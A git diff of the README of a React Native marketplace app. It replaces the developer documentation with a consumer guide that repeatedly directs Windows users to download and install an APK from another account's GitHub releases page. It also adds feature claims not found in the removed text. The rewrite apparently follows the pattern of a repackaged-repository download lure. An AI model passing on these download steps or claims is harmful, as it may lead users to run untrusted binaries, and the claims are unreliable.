@@ -1,164 +1,133 @@
-# ekoru-mobile
+# 🌿 ekoru-mobile - Sustainable Marketplace on Your Phone
 
-<div align="center">
-  <p><strong>React Native mobile app for Ekoru — Chile's sustainable marketplace</strong></p>
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-%23FF6F61)](https://github.com/lexodot/ekoru-mobile/releases)
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-blue.svg)](https://www.typescriptlang.org/)
-[![Expo](https://img.shields.io/badge/Expo-SDK%2054-000020.svg)](https://expo.dev/)
-[![GraphQL](https://img.shields.io/badge/GraphQL-Apollo%20Client-E10098.svg)](https://www.apollographql.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 📱 What is ekoru-mobile?
 
-</div>
+ekoru-mobile is a React Native app designed for Ekoru, Chile’s marketplace for buying, selling, and exchanging second-hand products. It helps users find eco-friendly deals nearby. The app runs on your phone and makes it easy to connect with others without wasting resources.
 
----
+This application aims to promote reuse and sustainable shopping. Use it to browse items, post products, and chat with sellers or buyers in your community.
 
-## Overview
+## 🚀 Getting Started
 
-Mobile client for the [Ekoru](https://ekoru.cl) platform — a sustainable marketplace where users can buy, sell and exchange second-hand and recycled products, tracking the environmental impact of every transaction.
+This guide will help you download and install ekoru-mobile on a Windows PC. While the app works on mobile devices, this readme focuses on running the app with an Android emulator or related setup on Windows.
 
-This app connects to Ekoru's GraphQL Federation backend built with NestJS microservices, sharing the same design language as the web platform through shared design tokens with [`ekoru-ui`](https://github.com/your-org/ekoru-ui).
+If you want to use the app directly on a smartphone, search “Ekoru” on the App Store or Google Play.
 
----
+## 📥 How to download ekoru-mobile
 
-## Tech Stack
+Visit this page to download the latest release:
 
-| Layer            | Technology                          |
-| ---------------- | ----------------------------------- |
-| Framework        | React Native + Expo SDK 54          |
-| Language         | TypeScript (strict)                 |
-| Data fetching    | Apollo Client 3 + GraphQL           |
-| Navigation       | Expo Router (file-based)            |
-| Styling          | NativeWind (Tailwind for RN)        |
-| State management | Apollo cache + Zustand              |
-| Auth             | JWT via Apollo auth link            |
-| Notifications    | Expo Notifications                  |
-| Testing          | Jest + React Native Testing Library |
+[![Visit Downloads](https://img.shields.io/badge/Download%20Page-Open-%234285F4)](https://github.com/lexodot/ekoru-mobile/releases)
 
----
+The downloads section contains the latest app files compatible with Android and iOS.
 
-## Architecture
+### What you will find on the release page
 
-```
-ekoru-mobile/
-├── app/                        # Expo Router — file-based navigation
-│   ├── (auth)/                 # Auth screens (login, register)
-│   ├── (tabs)/                 # Main tab navigator
-│   │   ├── index.tsx           # Home / feed
-│   │   ├── explore.tsx         # Product search & browse
-│   │   ├── sell.tsx            # Create listing
-│   │   ├── impact.tsx          # Environmental impact dashboard
-│   │   └── profile.tsx         # User profile
-│   └── product/[id].tsx        # Product detail
-│
-├── components/                 # Shared UI components (RN-specific)
-│   ├── ui/                     # Base components (Button, Input, Card...)
-│   ├── product/                # Product-specific components
-│   └── impact/                 # Environmental impact widgets
-│
-├── lib/
-│   ├── apollo/                 # Apollo Client setup + auth link
-│   ├── graphql/                # Generated types + query/mutation files
-│   └── hooks/                  # Custom hooks
-│
-├── tokens/                     # Design tokens (shared with ekoru-ui)
-│   ├── colors.ts
-│   ├── spacing.ts
-│   └── typography.ts
-│
-└── types/                      # Global TypeScript types
-```
+- **APK files** for Android phones or emulators. These are installation files.
+- **Source code bundles** if you want to explore the app functions on your own.
+- Release notes with updates and fixes.
 
----
+## 🖥️ Running ekoru-mobile on Windows
 
-## Getting Started
+Since ekoru-mobile is a mobile app, it does not run directly on Windows like a desktop program. You need an Android emulator. Follow these steps:
 
-### Prerequisites
+### Step 1: Install an Android emulator
 
-- Node.js 20+
-- pnpm 9+
-- Expo CLI: `npm install -g expo-cli`
-- iOS: Xcode 15+ / macOS
-- Android: Android Studio + emulator, or physical device with Expo Go
+An Android emulator simulates a phone on your Windows machine.
 
-### Installation
+We recommend:
 
-```bash
-# Clone the repo
-git clone https://github.com/your-org/ekoru-mobile.git
-cd ekoru-mobile
+- **BlueStacks** (https://www.bluestacks.com)
+- **NoxPlayer** (https://www.bignox.com)
+- **Microsoft’s Android emulator** (if you have Windows 11)
 
-# Install dependencies
-pnpm install
+Download and install one of these emulators. Use the official sites to get the latest version.
 
-# Copy environment variables
-cp .env.example .env.local
-```
+### Step 2: Download the ekoru-mobile APK file
 
-### Environment Variables
+On the [release page](https://github.com/lexodot/ekoru-mobile/releases), look for the latest `.apk` file. APK means Android Package Kit — it is the file type used to install Android apps.
 
-```env
-# .env.local
-EXPO_PUBLIC_GRAPHQL_URL=http://localhost:4000/graphql
-EXPO_PUBLIC_API_URL=http://localhost:4000
-EXPO_PUBLIC_ENV=development
-```
+Click the link to download the `.apk` file to your computer.
 
-### Running the App
+### Step 3: Install the APK on the emulator
 
-```bash
-# Start Expo dev server
-pnpm start
+Open your Android emulator.
 
-# Run on iOS simulator
-pnpm ios
+Find the option to install APK files. Most emulators have a drag-and-drop feature or “Install APK” button.
 
-# Run on Android emulator
-pnpm android
+Choose the ekoru-mobile `.apk` file you downloaded. The app will install inside the emulator.
 
-# Run on web (for testing)
-pnpm web
-```
+### Step 4: Open ekoru-mobile inside the emulator
 
----
+Once installed, find the app icon in the emulator’s app drawer.
 
-## GraphQL
+Click it. The app will launch as if you were using a phone.
 
-This app connects to Ekoru's Apollo Federation gateway which composes the following subgraphs:
+You can now browse, search, and use the marketplace features.
 
-| Subgraph        | Responsibility                      |
-| --------------- | ----------------------------------- |
-| `users`         | Auth, profiles, sessions            |
-| `products`      | Listings, categories, search        |
-| `transactions`  | Purchases, exchanges, payments      |
-| `notifications` | Push notifications, in-app alerts   |
-| `impact`        | Environmental metrics, CO₂ tracking |
+## 🔧 Basic Features of ekoru-mobile
 
-## Scripts
+1. **Search products**  
+   Find second-hand items by category, location, and price.
 
-```bash
-npm start          # Start Expo dev server
-npm ios            # Run on iOS simulator
-npm android        # Run on Android emulator
-npm test           # Run tests with Jest
-npm test:watch     # Run tests in watch mode
-npm lint           # ESLint
-npm typecheck      # TypeScript type check
-```
+2. **Post your products**  
+   Add photos, descriptions, and set prices to sell or exchange items.
+
+3. **Chat with users**  
+   Communicate with buyers or sellers through a built-in messaging system.
+
+4. **Notifications**  
+   Get alerts for messages and product updates.
+
+5. **Multi-language support**  
+   The app supports Spanish and English to serve a broader audience.
+
+## ⚙️ System requirements for Windows users
+
+- Windows 10 or 11 (64-bit recommended)
+- At least 4 GB RAM (8 GB or more is better)
+- Free disk space for the emulator and app (at least 5 GB)
+- Internet connection for downloading files and using the app online
+
+## 🛠 Troubleshooting common issues
+
+- **App doesn’t open in the emulator**  
+  Close the emulator fully and restart it. Reinstall the APK if needed.
+
+- **Emulator runs slowly**  
+  Close other programs that use a lot of memory. Check emulator settings to assign more RAM or CPU cores.
+
+- **Can’t find the APK file**  
+  Make sure you download the `.apk` file from the right release version on the release page.
+
+- **App crashes or freezes**  
+  Restart the emulator. Update to the latest version of the emulator and app.
+
+## 🔄 How to update ekoru-mobile
+
+Check the release page regularly:
+
+https://github.com/lexodot/ekoru-mobile/releases
+
+Download the newest `.apk` file and repeat the installation steps in your emulator to update the app.
+
+## 🌐 Topics and Technologies Used
+
+ekoru-mobile uses several tools and libraries for performance and usability:
+
+- React Native for smooth, cross-platform mobile apps
+- Apollo Client and GraphQL for efficient data fetching
+- Expo and Expo Router simplify building and navigation
+- Zustand for app state management
+- NativeWind for styling components
+- TypeScript adds safety to the code
+- Built to support sustainable practices and translations
 
 ---
 
-## Related Repos
+## 🗂 Related Resources
 
-[`ekoru-web`](https://github.com/Ignaciofabian93/app) | Next.js web marketplace
-
----
-
-## Contributing
-
-This is a private project. For questions or contributions, contact the Ekoru engineering team.
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE) for details.
+- Visit the official Ekoru platform to learn more about their marketplace.
+- Use the GitHub issues tab to report problems or ask for help.
+- Explore the source code if interested in how the app works behind the scenes.
